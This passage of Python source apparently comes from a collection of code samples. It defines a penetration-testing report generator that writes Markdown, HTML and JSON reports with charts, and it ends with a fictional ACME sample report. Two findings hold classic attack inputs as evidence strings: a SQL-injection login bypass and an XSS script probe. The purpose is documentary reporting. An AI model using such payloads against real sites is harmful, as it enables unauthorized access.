- **Password Attacks:** Hashcat, John the Ripper
- **Network Analysis:** Wireshark, tcpdump

## Scope

The assessment covered the following systems and networks:

{self._format_scope()}

## Testing Period

- **Start Date:** {self.metadata['start_date']}
- **End Date:** {self.metadata['end_date']}
- **Testing Hours:** [Total hours spent]

## Team

{self._format_team()}
\"\"\"
    
    def _format_scope(self) -> str:
        '''Formater la portée'''
        if not self.metadata['scope']:
            return "- [To be defined]"
        
        return "\\n".join(f"- {item}" for item in self.metadata['scope'])
    
    def _format_team(self) -> str:
        '''Formater l'équipe'''
        if not self.metadata['testers']:
            return "- [Team members]"
        
        return "\\n".join(f"- {tester}" for tester in self.metadata['testers'])
    
    def generate_recommendations(self) -> str:
        '''Générer les recommandations'''
        stats = self.findings_db.get_statistics()
        
        recommendations = \"\"\"
# RECOMMENDATIONS

## Immediate Actions (Critical/High)

### 1. Address Critical Vulnerabilities
All CRITICAL severity findings must be remediated immediately. These vulnerabilities
pose an immediate and significant risk to the organization.

### 2. Implement Security Controls
\"\"\"
        
        if stats['critical'] > 0 or stats['high'] > 0:
            recommendations += \"\"\"
- Deploy Web Application Firewall (WAF)
- Implement Intrusion Detection/Prevention System (IDS/IPS)
- Enable comprehensive logging and monitoring
- Conduct security awareness training
\"\"\"
        
        recommendations += \"\"\"

## Short-Term Actions (30-60 days)

### 1. Vulnerability Management Program
- Establish regular vulnerability scanning schedule
- Implement patch management process
- Create vulnerability remediation SLAs

### 2. Access Controls
- Implement principle of least privilege
- Enable multi-factor authentication (MFA)
- Review and update password policies
- Conduct access rights review

## Long-Term Actions (60-180 days)

### 1. Security Architecture Review
- Conduct comprehensive architecture security review
- Implement network segmentation
- Deploy Zero Trust security model
- Enhance monitoring and incident response capabilities

### 2. Continuous Security Testing
- Implement regular penetration testing
- Conduct security code reviews
- Perform red team exercises
- Establish bug bounty program

### 3. Security Training & Awareness
- Regular security training for all employees
- Phishing simulation campaigns
- Secure coding training for developers
- Incident response drills

## Compliance Considerations

Ensure remediation efforts align with relevant compliance requirements:
- PCI DSS (if applicable)
- HIPAA (if applicable)
- GDPR (if applicable)
- SOC 2
- ISO 27001
\"\"\"
        
        return recommendations
    
    def generate_charts(self) -> Dict[str, str]:
        '''Générer des graphiques'''
        stats = self.findings_db.get_statistics()
        charts = {}
        
        # Graphique par sévérité
        fig, ax = plt.subplots(figsize=(10, 6))
        severities = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
        counts = [stats['by_severity'].get(s, 0) for s in severities]
        colors = ['#d32f2f', '#ff6f00', '#ffa000', '#fbc02d', '#0288d1']
        
        ax.bar(severities, counts, color=colors)
        ax.set_xlabel('Severity')
        ax.set_ylabel('Count')
        ax.set_title('Findings by Severity')
        
        # Convertir en base64
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        charts['severity'] = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        # Graphique en camembert
        fig, ax = plt.subplots(figsize=(8, 8))
        ax.pie(counts, labels=severities, colors=colors, autopct='%1.1f%%', startangle=90)
        ax.set_title('Distribution of Findings')
        
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        charts['distribution'] = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        return charts
    
    def generate_html_report(self, output_path: str):
        '''Générer un rapport HTML complet'''
        stats = self.findings_db.get_statistics()
        charts = self.generate_charts()
        
        html = f\"\"\"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Testing Report - {self.client_name}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.5em;
        }}
        .metadata {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }}
        .card {{
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .severity-critical {{ background-color: #d32f2f; color: white; }}
        .severity-high {{ background-color: #ff6f00; color: white; }}
        .severity-medium {{ background-color: #ffa000; color: white; }}
        .severity-low {{ background-color: #fbc02d; }}
        .severity-info {{ background-color: #0288d1; color: white; }}
        .finding {{
            background: white;
            padding: 25px;
            margin-bottom: 20px;
            border-radius: 8px;
            border-left: 5px solid #667eea;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .finding h3 {{
            margin-top: 0;
            color: #667eea;
        }}
        .badge {{
            display: inline-block;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.9em;
        }}
        code {{
            background-color: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }}
        pre {{
            background-color: #f4f4f4;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }}
        .chart-container {{
            text-align: center;
            margin: 30px 0;
        }}
        .chart-container img {{
            max-width: 100%;
            height: auto;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #667eea;
            color: white;
        }}
        .footer {{
            background: #333;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 8px;
            margin-top: 40px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Penetration Testing Report</h1>
        <h2>{self.client_name}</h2>
        <p>{self.assessment_type}</p>
        <p>Report Date: {datetime.now().strftime('%B %d, %Y')}</p>
    </div>
    
    <div class="metadata">
        <div class="card">
            <h3>Assessment Period</h3>
            <p><strong>Start:</strong> {self.metadata.get('start_date', 'N/A')}</p>
            <p><strong>End:</strong> {self.metadata.get('end_date', 'N/A')}</p>
        </div>
        <div class="card">
            <h3>Summary Statistics</h3>
            <p><strong>Total Findings:</strong> {stats['total']}</p>
            <p><strong>Average CVSS:</strong> {stats['average_cvss']:.1f}</p>
        </div>
    </div>
    
    <div class="card">
        <h2>Findings Overview</h2>
        <table>
            <tr>
                <th>Severity</th>
                <th>Count</th>
                <th>Percentage</th>
            </tr>
            <tr>
                <td><span class="badge severity-critical">CRITICAL</span></td>
                <td>{stats['critical']}</td>
                <td>{(stats['critical'] / stats['total'] * 100) if stats['total'] > 0 else 0:.1f}%</td>
            </tr>
            <tr>
                <td><span class="badge severity-high">HIGH</span></td>
                <td>{stats['high']}</td>
                <td>{(stats['high'] / stats['total'] * 100) if stats['total'] > 0 else 0:.1f}%</td>
            </tr>
            <tr>
                <td><span class="badge severity-medium">MEDIUM</span></td>
                <td>{stats['medium']}</td>
                <td>{(stats['medium'] / stats['total'] * 100) if stats['total'] > 0 else 0:.1f}%</td>
            </tr>
            <tr>
                <td><span class="badge severity-low">LOW</span></td>
                <td>{stats['low']}</td>
                <td>{(stats['low'] / stats['total'] * 100) if stats['total'] > 0 else 0:.1f}%</td>
            </tr>
        </table>
    </div>
    
    <div class="chart-container">
        <h2>Visual Analysis</h2>
        <img src="data:image/png;base64,{charts.get('severity', '')}" alt="Severity Chart">
        <img src="data:image/png;base64,{charts.get('distribution', '')}" alt="Distribution Chart">
    </div>
    
    <div class="card">
        <h2>Detailed Findings</h2>
        {self._generate_html_findings()}
    </div>
    
    <div class="footer">
        <p>&copy; {datetime.now().year} Security Assessment Team</p>
        <p>CONFIDENTIAL - For {self.client_name} Use Only</p>
    </div>
</body>
</html>
\"\"\"
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"[+] HTML report generated: {output_path}")
    
    def _generate_html_findings(self) -> str:
        '''Générer le HTML des vulnérabilités'''
        html = ""
        
        for finding in self.findings_db.findings:
            severity_class = f"severity-{finding.severity.lower()}"
            
            html += f\"\"\"
        <div class="finding">
            <h3>{finding.id} - {finding.title}</h3>
            <p>
                <span class="badge {severity_class}">{finding.severity}</span>
                <span class="badge">CVSS: {finding.cvss_score}</span>
            </p>
            <h4>Description</h4>
            <p>{finding.description}</p>
            <h4>Impact</h4>
            <p>{finding.impact}</p>
            <h4>Remediation</h4>
            <p>{finding.remediation}</p>
        </div>
            \"\"\"
        
        return html
    
    def generate_full_report(self, output_dir: str = '.'):
        '''Générer le rapport complet'''
        print(f"\\n{'='*60}")
        print(f"GENERATING PENETRATION TESTING REPORT")
        print(f"{'='*60}\\n")
        
        # JSON export
        json_path = f"{output_dir}/findings.json"
        self.findings_db.export_json(json_path)
        
        # HTML report
        html_path = f"{output_dir}/pentest_report.html"
        self.generate_html_report(html_path)
        
        # Markdown report
        markdown_path = f"{output_dir}/pentest_report.md"
        with open(markdown_path, 'w', encoding='utf-8') as f:
            f.write(self.generate_executive_summary())
            f.write("\\n\\n")
            f.write(self.generate_methodology_section())
            f.write("\\n\\n")
            f.write(self.generate_technical_findings())
            f.write("\\n\\n")
            f.write(self.generate_recommendations())
        
        print(f"[+] Reports generated:")
        print(f"    - JSON: {json_path}")
        print(f"    - HTML: {html_path}")
        print(f"    - Markdown: {markdown_path}")

# ========================================
# EXEMPLE D'UTILISATION
# ========================================

def create_sample_report():
    '''Créer un exemple de rapport'''
    
    # Créer le générateur
    report = ReportGenerator(
        client_name="ACME Corporation",
        assessment_type="External Network Penetration Test"
    )
    
    # Définir les métadonnées
    report.metadata = {
        'start_date': '2024-01-15',
        'end_date': '2024-01-19',
        'testers': ['John Doe, OSCP', 'Jane Smith, CEH'],
        'scope': [
            '192.168.1.0/24',
            'www.acme.com',
            'api.acme.com'
        ]
    }
    
    # Ajouter des vulnérabilités
    vuln1 = Finding("SQL Injection in Login Form", "CRITICAL", 9.8)
    vuln1.description = "The login form is vulnerable to SQL injection attacks."
    vuln1.impact = "An attacker can bypass authentication and access sensitive data."
    vuln1.affected_systems = ["www.acme.com/login"]
    vuln1.evidence = ["1' OR '1'='1 -- successfully bypassed login"]
    vuln1.remediation = "Use parameterized queries for all database interactions."
    vuln1.references = ["OWASP SQL Injection", "CWE-89"]
    report.findings_db.add_finding(vuln1)
    
    vuln2 = Finding("Cross-Site Scripting (XSS)", "HIGH", 7.5)
    vuln2.description = "Reflected XSS vulnerability in search functionality."
    vuln2.impact = "An attacker can execute arbitrary JavaScript in victim's browser."
    vuln2.affected_systems = ["www.acme.com/search"]
    vuln2.evidence = ["<script>alert('XSS')</script> successfully executed"]
    vuln2.remediation = "Implement proper input validation and output encoding."
    report.findings_db.add_finding(vuln2)
    
    vuln3 = Finding("Weak Password Policy", "MEDIUM", 5.3)
    vuln3.description = "Password policy allows weak passwords."
    vuln3.impact = "Increases risk of successful brute force attacks."
    vuln3.remediation = "Implement strong password requirements (12+ chars, complexity)."
    report.findings_db.add_finding(vuln3)
    
    # Générer les rapports
    report.generate_full_report(output_dir='reports')

if __name__ == "__main__":
    create_sample_report()
"""
    },
    
}


